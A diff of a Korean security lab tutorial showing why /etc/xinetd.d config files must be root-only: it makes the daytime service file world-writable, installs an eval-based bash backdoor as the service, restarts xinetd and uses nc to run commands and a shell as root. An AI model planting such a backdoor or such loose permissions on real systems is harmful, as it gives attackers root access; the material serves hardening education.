@@ -1,24 +1,22 @@
 ## /etc/(x)inetd.conf 파일 소유자 및 권한 설정
 
-누구나 `xinetd` 설정 파일을 수정할 수 있으면 어떤 문제가 발생할 수 있는지 알아봅시다.
+리눅스의 슈퍼 데몬인 `xinetd`의 설정 파일을 `root` 외의 사용자가 수정할 수 있으면 어떤 문제가 발생할 수 있는지 알아봅시다.
 
-### 실습 1 : `xinetd` 설정 파일 수정을 통한 간단한 백도어 생성
+### [우분투 : 취약한 리눅스 서버 관리자] 취약한 시스템을 만듭니다.
 
-**[취약한 리눅스 서버 관리자] 취약한 시스템을 만듭시다!**
-
-1. 우선 슈퍼 데몬인 `xinetd`를 설치합니다.
+A. 우분투 데스크탑 22.04 LTS에는 슈퍼 데몬인 `xinetd`가 설치되어 있지 않습니다. 그러므로 먼저 `xinetd`를 설치합니다.
 
 ```
 cju@wooam:~$ sudo apt install xinetd
 ```
 
-2. `xinetd.conf` 파일의 접근 권한을 살펴봅시다.
+B. `xinetd.conf` 파일의 소유자와 접근 권한을 살펴봅시다. 소유자는 `root`이고 접근 권한은 `-rw-r--r--`(644)입니다.
 
 ```
 cju@wooam:~$ ls -l /etc/xinet.conf
 ```
 
-3. `xinetd.conf` 파일의 내용도 살펴봅시다. `/etc/xinetd.d` 디렉터리를 포함(`includedir`)하는 것을 확인할 수 있습니다.
+C. `xinetd.conf` 파일의 내용도 살펴봅시다. `/etc/xinetd.d` 디렉터리를 포함(`includedir`)하는 것을 확인할 수 있습니다.
 
 ```
 cju@wooam:~$ cat /etc/xinetd.conf
@@ -38,46 +36,54 @@ defaults
 includedir /etc/xinetd.d
 ```
 
-4. `/etc/xinetd.d` 디렉토리를 살펴봅시다.
+D. `/etc/xinetd.d` 디렉토리를 살펴봅시다. `xinetd`를 통해 서비스될 수 있는 다양한 서비스 설정 파일이 있습니다.
 
 ```
 cju@wooam:~$ ls /etc/xinetd.d/
 chargen  chargen-udp  daytime  daytime-udp  discard  discard-udp  echo  echo-udp  servers  services  time  time-udp
 ```
 
-5. `/etc/xinetd.d` 디렉터리 파일 중 하나의 접근 권한을 `-rw-rw-rw-`로 변경합니다. 여기서는 `daytime`의 접근 권한을 변경합니다.
+E. `/etc/xinetd.d` 디렉터리 안에 있는 설정 파일 중 하나의 접근 권한을 `-rw-rw-rw-`(666)로 변경합니다. 여기서는 `daytime`의 접근 권한을 변경합니다.
 
 ```
 cju@wooam:~$ sudo chmod 666 /etc/xinetd.d/daytime
 ```
 
-**[공격자] `daytime` 서비스 대신 백도어를 올립니다!**
+## [칼리 : 공격자] `xinetd` 자체의 `daytime` 서비스 대신 백도어를 올립니다!
 
-> 공격자가 취약한 리눅스 서버에 일반 사용자 계정으로 접속했다고 가정합니다.
+> 공격자가 취약한 리눅스 서버의 일반 사용자 계정을 탈취했다고 가정합니다.
 
-6. `xinetd` 관련 파일의 접근 권한을 살펴봅시다. `/etc/xinetd.d/daytime` 파일을 아무나 수정할 수 있음을 발견합니다.
+A. 먼저 일반 사용자 계정을 사용하여 우분투 데스크탑에 원격 접속합니다.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ ssh aaa@192.168.xxx.xxx 13
+```
+
+B. `xinetd` 설정 파일의 접근 권한을 살펴봅시다. `/etc/xinetd.d/daytime` 파일을 누구나 수정할 수 있음을 발견합니다.
 
 ```
 aaa@wooam:~$ ls -l /etc/xinetd.conf /etc/xinetd.d
 ```
 
-7. 아래와 같이 간단한 백도어를 만듭니다.
+C. 아래와 같이 간단한 백도어를 만듭니다.
 
 ```
 aaa@wooam:~$ cat hola
 #!/bin/bash
+echo "Welcome to the victim server!"
 read yourcommand
 eval $yourcommand
 echo "Thanks you for using this backdoor!"
 ```
 
-8. 만든 백도어 파일에 실행 권한을 부여합니다.
+D. 만든 백도어 파일에 실행 권한을 부여합니다.
 
 ```
 aaa@wooam:~$ chmod 755 hola
 ```
 
-9. `/etc/xinetd.d/daytime` 파일을 아래와 같이 수정합니다. `disable = no`로 수정하고 `type = INTERNAL` 라인은 삭제합니다. 그리고 `server = /home/aaa/hola`를 추가합니다.
+E. `/etc/xinetd.d/daytime` 파일을 아래와 같이 수정합니다. `disable = no`로 수정하고 `type = INTERNAL` 라인은 삭제합니다. 그리고 `server = /home/aaa/hola`를 추가합니다. 이렇게 설정을 변경하면 `xinetd`는 자체의 `daytime` 서비스를 제공하지 않고 `/home/aaa/hola`의 실행을 통해 서비스를 제공합니다.
 
 ```
 aaa@wooam:~$ cat /etc/xinetd.d/daytime
@@ -110,34 +116,46 @@ service daytime
 
 ```
 
-10. `xinetd` 서비스가 재시작되었다고 가정합니다.
+F. 원격 접속을 종료합니다.
+
+```
+aaa@wooam:~$ exit
+```
+
+### [우분투 : 취약한 리눅스 서버 관리자] `xinetd`를 재시작합니다...
+
+A. `xinetd` 서비스를 재시작합니다.
 
 ```
 cju@wooam:~$ sudo systemctl restart xinetd
 ```
 
-**[공격자] `daytime` 백도어를 통해 자유롭게 시스템을 사용합니다!!!**
+### [칼리 : 공격자] `daytime` 백도어를 통해 자유롭게 시스템을 사용합니다!!!
 
-11. `nc` 명령어를 이용하여 백도어에 접근합니다.
+A. `nc` 명령어를 이용하여 백도어에 접근합니다.
 
 ```
 ┌──(kali㉿kali)-[~]
 └─$ nc -v 192.168.xxx.xxx 13
 192.168.102.128: inverse host lookup failed: Unknown host
 (UNKNOWN) [192.168.xxx.xxx] 13 (daytime) open
+Welcome to the victim server!
 whoami
 root
+Thank you for using this backdoor!
 ```
 
-12. 셸도 실행 가능합니다!
+B. 셸도 실행 가능합니다!
 
 ```
 ┌──(kali㉿kali)-[~]
 └─$ nc -v 192.168.xxx.xxx 13
 192.168.102.128: inverse host lookup failed: Unknown host
 (UNKNOWN) [192.168.xxx.xxx] 13 (daytime) open
+Welcome to the victim server!
 sh
 pwd
 /
 exit
+Thank you for using this backdoor!
 ```
